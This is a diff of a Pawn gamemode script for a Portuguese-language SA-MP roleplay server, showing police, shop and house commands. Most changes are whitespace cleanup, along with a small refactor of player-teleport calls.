@@ -19674,7 +19674,7 @@ COMMAND:carroreparar(playerid, params[], help)
 COMMAND:ajudapolicia(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
-	
+
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/algemar - /desalgemar - /revistar - /apreender - /multar - /puxar - /prender");
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/colocarbarreira - /retirarbarreira - /retirartodasbarreiras - /rebocar - /portapsp - /garagempsp");
 	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA POLÍCIA]: {FFFFFF}/sirene - /apreendercarro - /desapreendercarro - /testebalao - /checkmatricula");
@@ -19706,7 +19706,7 @@ COMMAND:verregisto(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_ORANGE, string);
 
 	SendClientMessage(playerid, COLOR_ORANGE, "____________________________________________________________________");
-	
+
 	PlayerActionMessage(playerid, 15.0, "procura registos no seu PDA.");
 
     return 1;
@@ -19727,15 +19727,17 @@ COMMAND:mostrardistintivo(playerid, params[], help)
 
 	format(string, sizeof(string), "Mostraste o teu distintivo ao jogador %s", GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_ORANGE, string);
-	
+
 	SendClientMessage(giveplayerid, COLOR_ORANGE, "________________________________________________________");
-	
+
 	format(string, sizeof(string), "Nome: {FFFFFF}%s", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
 	format(string, sizeof(string), "Número do distintivo: {FFFFFF}%d", pInfo[playerid][UID]);
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	
+
 	SendClientMessage(giveplayerid, COLOR_ORANGE, "________________________________________________________");
+
+	VirarAmigo(playerid, giveplayerid);
 
     return 1;
 }
@@ -19750,13 +19752,13 @@ COMMAND:procurados(playerid, params[], help)
     foreach(new i : Player)
     {
         if(pInfo[i][Suspeito] == 0) continue;
-        
+
 		format(string, sizeof(string), "[PROCURADOS]: {FFFFFF}%s (ID:%d)", GetPlayerNameEx(i), i);
 		SendClientMessage(playerid, COLOR_ORANGE, string);
-		
+
 		found = 1;
     }
-    
+
     if(found == 0) return SendClientMessage(playerid, COLOR_ORANGE, "[PROCURADOS:] {FFFFFF}Nenhum suspeito encontrado");
 
     return 1;
@@ -19771,7 +19773,7 @@ COMMAND:suspeitar(playerid, params[], help)
 
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/suspeitar <playerid>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-    
+
     if(pInfo[giveplayerid][Suspeito] == 0)
     {
 	    pInfo[giveplayerid][Suspeito] = 1;
@@ -19794,16 +19796,16 @@ COMMAND:checkmatricula(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
-    new matricula[9], string[128], bool:found = false;
+
+    new matricula[9], string[128], bool: found = false;
 
     if(sscanf(params, "s[9]", matricula)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/checkmatricula <matrícula>");
     if(strlen(matricula) != 8) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tamanho da matrícula inválida");
-    
+
     for(new c = 0; c < MAX_CARROS; c++)
     {
     	if(c == 0) continue;
-    	
+
 		if(strfind(cInfo[c][Matricula], matricula, true) != -1)
 		{
  			SendClientMessage(playerid, COLOR_CHAT, "_______________________________[ BASE DE DADOS DA PSP ]_______________________________");
@@ -19818,10 +19820,10 @@ COMMAND:checkmatricula(playerid, params[], help)
 			found = true;
 			break;
 		}
-		
+
 		if(c == 5) break;
     }
-    
+
     if(found == false)
     {
         SendClientMessage(playerid, COLOR_INFO, "Essa matrícula não foi encontrada na Base de Dados da PSP.");
@@ -19842,9 +19844,9 @@ COMMAND:testebalao(playerid, params[], help)
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/testebalao <playerid>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
-	
+
 	new taxa[8], contra[16];
-	
+
 	switch(DrunkLevel[giveplayerid])
 	{
 	    case 0:
@@ -19878,9 +19880,9 @@ COMMAND:testebalao(playerid, params[], help)
 		    contra = "Crime";
 		}
 	}
-	
+
 	PlayerActionMessage(giveplayerid, 15.0, "sopra no balão.");
-	
+
 	format(string, sizeof(string), "%s: {FFFFFF}[{99FF00}Taxa de álcool no sangue: {FFFFFF}%s g/L | {99FF00}Contra Ordenação: {FFFFFF}%s", GetPlayerNameEx(giveplayerid), taxa, contra);
 	SendClientMessage(playerid, COLOR_ORANGE, string);
 
@@ -19913,7 +19915,7 @@ COMMAND:apreendercarro(playerid, params[], help)
 
 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
 	if(IsInGaragemPSP(playerid) == 0) return SendClientMessage(playerid, COLOR_ERRO, "Precisas de estar na Garagem dos Apreendidos da PSP");
-	
+
     new car = GetPlayerVehicleID(playerid);
     new Float:cx, Float:cy, Float:cz, Float:angle, Float:hp;
 
@@ -19937,7 +19939,7 @@ COMMAND:apreendercarro(playerid, params[], help)
 	cInfo[car][mod9] = 0;
 	cInfo[car][mod10] = 0;
 	cInfo[car][mod11] = 0;
-	
+
 	ChangeVehiclePaintjob(car, 3);
 	RemoveVehicleComponent(car, cInfo[car][mod1]);
 	RemoveVehicleComponent(car, cInfo[car][mod2]);
@@ -19961,7 +19963,7 @@ COMMAND:apreendercarro(playerid, params[], help)
 	AtualizarDanosCarro(car);
 	SetVehicleHealth(car, hp);
 	PutPlayerInVehicle(playerid, cInfo[car][ID], 0);
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Carro apreendido");
 
     return 1;
@@ -19977,7 +19979,7 @@ COMMAND:sirene(playerid, params[], help)
     if(sscanf(params, "d", type)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/sirene <1: Dentro | 2: Tejadilho>");
     if(type <= 0 || type > 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Type inválido");
 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-	
+
 	new car = GetPlayerVehicleID(playerid);
 
 	if(Sirene[car] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo já tem sirene");
@@ -19995,7 +19997,7 @@ COMMAND:sirene(playerid, params[], help)
      		AttachObjectToVehicle(Sirene_O[car], car, -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);
 		}
 	}
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Colocaste uma sirene no veículo (/desligarsirene)");
 
 	Sirene[car] = 1;
@@ -20006,15 +20008,15 @@ COMMAND:sirene(playerid, params[], help)
 COMMAND:desligarsirene(playerid, params[], help)
 {
     if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA && AdminDuty[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
-    
+
     new car = GetPlayerVehicleID(playerid);
-    
+
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
     if(Sirene[car] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse veículo não tem sirene");
-    
+
     DestroyObject(Sirene_O[car]);
     Sirene[car] = 0;
-    
+
     SendClientMessage(playerid, COLOR_INFO, "Desligaste a sirene do veículo");
 
 	return 1;
@@ -20029,20 +20031,20 @@ COMMAND:garagemsr(playerid, params[], help)
 		if(srgaragem1_1_b == false && srgaragem1_2_b == false)
   		{
 			PlayerActionMessage(playerid, 15.0, "clica no comando e abre a porta.");
-			
+
     		MoveDynamicObject(srgaragem1_1, 327.46304, -1479.92493, 22.55216, 2.00);
     		MoveDynamicObject(srgaragem1_2, 327.46304, -1479.92493, 22.55216, 2.00);
-    		
+
 			srgaragem1_1_b = true;
 			srgaragem1_2_b = true;
 		}
 		else
 		{
 			PlayerActionMessage(playerid, 15.0, "clica no comando e fecha a porta.");
-			
+
     		MoveDynamicObject(srgaragem1_1, 327.46304, -1479.92493, 29.11834, 2.00);
     		MoveDynamicObject(srgaragem1_2, 327.46304, -1479.92493, 25.71881, 2.00);
-			
+
 			srgaragem1_1_b = false;
 			srgaragem1_2_b = false;
 		}
@@ -20083,17 +20085,17 @@ COMMAND:garagempsp(playerid, params[], help)
 		if(pspgaragem1_b == false && pspgaragem2_b == false)
   		{
 			PlayerActionMessage(playerid, 15.0, "clica no comando e abre a porta.");
-			
+
 			MoveDynamicObject(pspgaragem1, 1590.41174, -1638.20911, 10.46357, 2.00);
 			MoveDynamicObject(pspgaragem2, 1585.94800, -1638.11829, 10.54216, 2.00);
-    		
+
 			pspgaragem1_b = true;
 			pspgaragem2_b = true;
 		}
 		else
 		{
 			PlayerActionMessage(playerid, 15.0, "clica no comando e fecha a porta.");
-			
+
 			MoveDynamicObject(pspgaragem1, 1590.41174, -1638.20911, 13.91207, 2.00);
 			MoveDynamicObject(pspgaragem2, 1585.94800, -1638.11829, 13.84867, 2.00);
 
@@ -20139,7 +20141,7 @@ COMMAND:portapsp(playerid, params[], help)
 	  		pspentrada2_b = false;
 		}
 	}
-	
+
 	return 1;
 }
 
@@ -20167,9 +20169,7 @@ COMMAND:prender(playerid, params[], help)
 		pInfo[giveplayerid][PresoTempo] = time*60;
 		ResetPlayerWeapons(giveplayerid);
 
-		SetPlayerInterior(giveplayerid, 0);
-		SetPlayerVirtualWorld(giveplayerid,0);
-		SetPlayerPosEx(giveplayerid, 1583.6875, -1680.5103, 1089.5883);
+		SetPlayerPosEx(giveplayerid, 1583.6875, -1680.5103, 1089.5883, 0, 0);
 	}
 	else
 	{
@@ -20204,12 +20204,12 @@ COMMAND:colocarbarreira(playerid, params[], help)
 
 	if(barreira <= 0 || barreira > 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Barreira inválida");
 	if(BarreirasCounter > (MAX_BARREIRAS-1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Barreiras méximas atingidas");
-	
+
 	new Float:x, Float:y, Float:z, Float:a;
-	
+
 	GetPlayerPos(playerid, x, y, z);
 	GetPlayerFacingAngle(playerid, a);
-	
+
 	switch(barreira)
 	{
 	    case 1:
@@ -20233,12 +20233,12 @@ COMMAND:colocarbarreira(playerid, params[], help)
             format(string, sizeof(string), "Colocaste a barreira %d (Bloqueio)", BarreirasCounter);
 	    }
 	}
-	
+
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
  	GameTextForPlayer(playerid, "~w~Barreira ~b~Montada!", 1000, 1);
   	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
-  	
+
 	BarreirasCounter++;
 
 	return 1;
@@ -20261,7 +20261,7 @@ COMMAND:retirarbarreira(playerid, params[], help)
 
 	format(string, sizeof(string), "Retiraste a barreira %d", barreira);
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
  	GameTextForPlayer(playerid, "~w~Barreira ~r~Desmontada!", 1000, 1);
   	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
 
@@ -20280,9 +20280,9 @@ COMMAND:retirartodasbarreiras(playerid, params[], help)
     }
 
     BarreirasCounter = 0;
-    
+
 	SendClientMessage(playerid, COLOR_INFO, "Retiraste todas as barreiras");
-	
+
 	return 1;
 }
 
@@ -20304,9 +20304,9 @@ COMMAND:puxar(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O jogador %s puxou-te para dentro do seu carro.", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	PutPlayerInVehicle(giveplayerid, GetPlayerVehicleID(playerid), 1);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "puxa para dentro do carro");
 
 	return 1;
@@ -20351,19 +20351,19 @@ COMMAND:apreender(playerid, params[], help)
 	{
  		SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/apreender <playerid> <item>");
  		SendClientMessage(playerid, COLOR_CHAT, "[Items]: {FFFFFF}cartaligeiros, cartamotociclos, cartapesados, licençaarmas, drogas, materiais, armas");
- 		
+
  		return 1;
 	}
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes fazer isso a ti próprio");
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
-	
+
 	if(strcmp(item, "cartaligeiros", true) == 0)
 	{
 	    if(pInfo[giveplayerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem carta de Ligeiros");
-	    
+
 	    pInfo[giveplayerid][CartaLig] = 0;
-	    
+
 	    format(string, sizeof(string), "Apreendeste a carta de Ligeiros ao jogador %s", GetPlayerNameEx(giveplayerid));
 	    SendClientMessage(playerid, COLOR_INFO, string);
 	    format(string, sizeof(string), "O jogador %s apreendeu a tua carta de Ligeiros.", GetPlayerNameEx(playerid));
@@ -20446,7 +20446,7 @@ COMMAND:apreender(playerid, params[], help)
 				counter++;
 			}
 		}
-		
+
 	    if(counter == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não tem Armas");
 
 	    ResetPlayerWeapons(giveplayerid);
@@ -20475,7 +20475,7 @@ COMMAND:revistar(playerid, params[], help)
 
 	format(string, sizeof(string), "Drogas Encontradas: {FFFFFF}%d {52E3BA}| Materiais Encontrados: {FFFFFF}%d {52E3BA}| Total de Multas: {FFFFFF}%d", pInfo[giveplayerid][Drogas], pInfo[giveplayerid][Materiais], pInfo[giveplayerid][Multas]);
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
 	new Player_Weapons[13];
 	new Player_Ammos[13];
 	new i, counter;
@@ -20486,18 +20486,18 @@ COMMAND:revistar(playerid, params[], help)
 		if(Player_Weapons[i] != 0)
 		{
 			new weaponName[128];
-			
+
 			GetWeaponName(Player_Weapons[i], weaponName,255);
-			
+
 			format(string, 255, "Arma Encontrada: {FFFFFF}%s.", weaponName);
 			SendClientMessage(playerid, COLOR_INFO, string);
-			
+
 			counter++;
 		}
 	}
-	
+
 	if(counter == 0) { SendClientMessage(playerid, COLOR_INFO, "Não foram encontradas armas"); }
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "revista");
 
 	return 1;
@@ -20521,7 +20521,7 @@ COMMAND:desalgemar(playerid, params[], help)
 
 	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
 	SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
-	
+
 	RemovePlayerAttachedObject(giveplayerid, 0);
 	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_NONE);
 
@@ -20529,7 +20529,7 @@ COMMAND:desalgemar(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "Foste desalgemado por %s", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "desalgema");
 
 	return 1;
@@ -20539,26 +20539,26 @@ COMMAND:algemar(playerid, params[], help)
 {
 	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
 	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
-	
+
 	new giveplayerid, string[128];
-	
+
 	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/algemar <playerid>");
-	
+
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(Algemado[giveplayerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já está algemado");
 	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes algemar a ti próprio");
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
-	
+
 	Algemado[giveplayerid] = true;
-	
+
 	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
 	SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
-	
+
 	format(string, sizeof(string), "Algemaste o jogador %s", GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "Foste algemado por %s", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "algema");
 
 	return 1;
@@ -20594,7 +20594,7 @@ COMMAND:trancarloja(playerid, params[], help)
 		SendClientMessage(playerid, COLOR_INFO, "Destrancaste a tua loja");
 		PlayerActionMessage(playerid, 15.0, "põe a chave na fechadura e abre a loja.");
 	}
-	
+
 	AtualizarBiz(bID);
 
 	return 1;
@@ -20608,14 +20608,14 @@ COMMAND:loja(playerid, params[], help)
 	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
 	if(bInfo[bID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");
 	if(pInfo[playerid][ChaveBiz] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa loja");
-	
+
 	new string[128], sdialog[512];
-	
+
 	format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Info Loja"); strcat(sdialog,string);
 	format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Mudar preço de entrada"); strcat(sdialog,string);
 	format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Mudar nome da loja"); strcat(sdialog,string);
 	format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Extrair"); strcat(sdialog,string);
-	
+
 	if(bInfo[bID][Type] == BTYPE_SEGURADORA)
 	{
 		format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Alterar mensalidade do seguro"); strcat(sdialog,string);
@@ -20636,7 +20636,7 @@ COMMAND:ajudacasa(playerid, params[], help)
 COMMAND:abrircasa(playerid, params[], help)
 {
     new hID = IsPlayerAtHouseEntrance(playerid);
-    
+
     if(hID == 0) hID = IsPlayerAtHouseExit(playerid);
 
 	if(pInfo[playerid][ChaveCasa] != hID && pInfo[playerid][ChaveCasaAlugada] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não te pertence");
@@ -20660,7 +20660,7 @@ COMMAND:porarmacasa(playerid, params[], help)
 {
     new hID = GetPlayerVirtualWorld(playerid);
     new slot;
-    
+
     if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmacasa <slot>");
 
 	if(pInfo[playerid][ChaveCasa] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma casa");
@@ -20668,40 +20668,40 @@ COMMAND:porarmacasa(playerid, params[], help)
 	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está comprada");
 	if(pInfo[playerid][ChaveCasa] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa casa");
 	if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido");
-	
+
 	new arma = GetPlayerWeapon(playerid);
 	new ammo = GetPlayerAmmo(playerid);
-	
+
 	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
 	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");
-	
+
 	switch(slot)
 	{
 	    case 1:
 	    {
 	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
-	        
+
 	        hInfo[hID][Arma1] = arma;
 	        hInfo[hID][Ammo1] = ammo;
 	    }
 	    case 2:
 	    {
 	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
-	        
+
 	        hInfo[hID][Arma2] = arma;
 	        hInfo[hID][Ammo2] = ammo;
 	    }
 	    case 3:
 	    {
 	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
-	        
+
 	        hInfo[hID][Arma3] = arma;
 	        hInfo[hID][Ammo3] = ammo;
 	    }
 	}
-	
+
 	RemovePlayerWeapon(playerid, arma);
-	
+
 	PlayerActionMessage(playerid, 15.0, "abre o cofre e esconde uma arma lá dentro");
 
 	return 1;
@@ -20726,10 +20726,10 @@ COMMAND:tirararmacasa(playerid, params[], help)
 	    case 1:
 	    {
 	        if(hInfo[hID][Ammo1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");
-	        
+
 	        GivePlayerWeapon(playerid, hInfo[hID][Arma1], hInfo[hID][Ammo1]);
 	        format(string, sizeof(string), "Tiraste a arma %s (Slot:1) com %d de munição", GetWeapName(hInfo[hID][Arma1]), hInfo[hID][Ammo1]);
-	        
+
 	        hInfo[hID][Arma1] = 0;
 	        hInfo[hID][Ammo1] = 0;
 	    }
@@ -20739,7 +20739,7 @@ COMMAND:tirararmacasa(playerid, params[], help)
 
 	        GivePlayerWeapon(playerid, hInfo[hID][Arma2], hInfo[hID][Ammo2]);
 	        format(string, sizeof(string), "Tiraste a arma %s (Slot:2) com %d de munição", GetWeapName(hInfo[hID][Arma2]), hInfo[hID][Ammo2]);
-	        
+
 	        hInfo[hID][Arma2] = 0;
 	        hInfo[hID][Ammo2] = 0;
 	    }
@@ -20749,12 +20749,12 @@ COMMAND:tirararmacasa(playerid, params[], help)
 
 	        GivePlayerWeapon(playerid, hInfo[hID][Arma3], hInfo[hID][Ammo3]);
 	        format(string, sizeof(string), "Tiraste a arma %s (Slot:3) com %d de munição", GetWeapName(hInfo[hID][Arma3]), hInfo[hID][Ammo3]);
-	        
+
 	        hInfo[hID][Arma3] = 0;
 	        hInfo[hID][Ammo3] = 0;
 		}
 	}
-	
+
 	PlayerActionMessage(playerid, 15.0, "abre o cofre e tira uma arma lá de dentro");
 
 	return 1;
@@ -20791,13 +20791,13 @@ COMMAND:venderloja(playerid, params[], help)
 	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
 	if(bInfo[bID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");
 	if(pInfo[playerid][ChaveBiz] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa loja");
-	
+
 	GivePlayerMoneyEx(playerid, bInfo[bID][Price]/2);
-	
+
 	if(bInfo[bID][Bank] < 0)
 	{
 	    pInfo[playerid][Bank] += bInfo[bID][Bank];
-	    
+
     	format(string, sizeof(string), "Tinhas dívidas da loja. Pagaste %d$.", bInfo[bID][Bank]);
 		SendClientMessage(playerid, COLOR_INFO, string);
 	}
@@ -20809,27 +20809,27 @@ COMMAND:venderloja(playerid, params[], help)
 	bInfo[bID][Entrada] = 0;
  	format(bInfo[bID][Nome], 32, "%s", "Unused");
   	format(bInfo[bID][Owner], 32, "%s", "Ninguém");
-  	
+
   	pInfo[playerid][ChaveBiz] = 0;
 
 	format(string, sizeof(string), "Vendeste a loja %d e recebeste %d$", bID, bInfo[bID][Price]/2);
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
 	return 1;
 }
 
 COMMAND:comprarloja(playerid, params[], help)
 {
     new bID = IsPlayerAtBizEntrance(playerid);
-    
+
 	if(pInfo[playerid][ChaveBiz] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma loja");
 	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
 	if(bInfo[bID][Comprada] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja já foi comprada");
 	if(bInfo[bID][Price] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está configurada, contacta um administrador");
 	if(GetPlayerMoneyEx(playerid) < bInfo[bID][Price]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	
+
 	new string[128];
-	
+
 	bInfo[bID][Comprada] = 1;
 	bInfo[bID][Locked] = 0;
 	bInfo[bID][Produtos] = 10;
@@ -20837,16 +20837,16 @@ COMMAND:comprarloja(playerid, params[], help)
 	bInfo[bID][Entrada] = 0;
  	format(bInfo[bID][Nome], 32, "%s", "Sem Nome");
   	format(bInfo[bID][Owner], 32, "%s", GetPlayerNameEx(playerid));
-  	
+
   	GuardarBizz(bID);
   	AtualizarBiz(bID);
-  	
+
   	pInfo[playerid][ChaveBiz] = bID;
   	GivePlayerMoneyEx(playerid, -bInfo[bID][Price]);
-	
+
 	format(string, sizeof(string), "Compraste a loja %d", bID);
 	SendClientMessage(playerid, COLOR_INFO, string);
-	
+
 	PlayerActionMessage(playerid, 15.0, "acaba de preencher os papeis e recebe a chave da loja.");
 
 	return 1;
@@ -20906,13 +20906,13 @@ COMMAND:comprarcasa(playerid, params[], help)
 	hInfo[hID][PickupID] = 19133;
 	hInfo[hID][AluguerStatus] = 0;
 	hInfo[hID][Aluguer] = 0;
-	
+
  	format(hInfo[hID][Nome], 32, "%s", "Sem Nome");
   	format(hInfo[hID][Owner], 32, "%s", GetPlayerNameEx(playerid));
 
   	pInfo[playerid][ChaveCasa] = hID;
   	GivePlayerMoneyEx(playerid, -hInfo[hID][Price]);
-  	
+
   	AtualizarCasa(hID);
 
 	format(string, sizeof(string), "Compraste a loja %d", hID);
@@ -20937,7 +20937,7 @@ COMMAND:alugarcasa(playerid, params[], help)
 
 	pInfo[playerid][ChaveCasaAlugada] = hID;
 	hInfo[hID][Bank] += hInfo[hID][Aluguer];
-	
+
 	format(string, sizeof(string), "Alugaste a casa %d", hID);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -20950,27 +20950,25 @@ COMMAND:sair(playerid, params[], help)
 
 	if(bID != 0)
 	{
-		SetPlayerInterior(playerid, 0);
-		SetPlayerVirtualWorld(playerid, 0);
-		SetPlayerPosEx(playerid, bInfo[bID][EnterX], bInfo[bID][EnterY], bInfo[bID][EnterZ]+0.2);
+		SetPlayerPosEx(playerid, bInfo[bID][EnterX], bInfo[bID][EnterY], bInfo[bID][EnterZ]+0.2, 0, 0);
 
 		return 1;
 	}
-	
+
 	new hID = IsPlayerAtHouseExit(playerid);
-	
+
 	if(hID != 0)
 	{
 	    if(hInfo[hID][IsCaravana] == 1 || hInfo[hID][IsCaravana] == 2)
 	    {
 	        new Float:x, Float:y, Float:z;
-	        
+
 	        if(GetVehicleSpeed(hInfo[hID][CarroCaravanaID]) > 5)
 	        {
 	            SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes sair agora da caravana, ela está em movimento!");
 	            return 1;
 	        }
-	        
+
 			if(hInfo[hID][IsCaravana] == 1)
 			{
 				GetVehicleRelativePos(hInfo[hID][CarroCaravanaID], x, y, z, 1.8, 0.3, -0.5); // journey 	    1.8 0.3 -0.5
@@ -20979,28 +20977,22 @@ COMMAND:sair(playerid, params[], help)
 			{
 			    GetVehicleRelativePos(hInfo[hID][CarroCaravanaID], x, y, z, -0.7, -2.7, 1); // tropic 	    -0.5 -2.3 1
 			}
-	        
-			SetPlayerInterior(playerid, 0);
-			SetPlayerVirtualWorld(playerid, 0);
-			SetPlayerPosEx(playerid, x, y, z+0.2);
-			
+
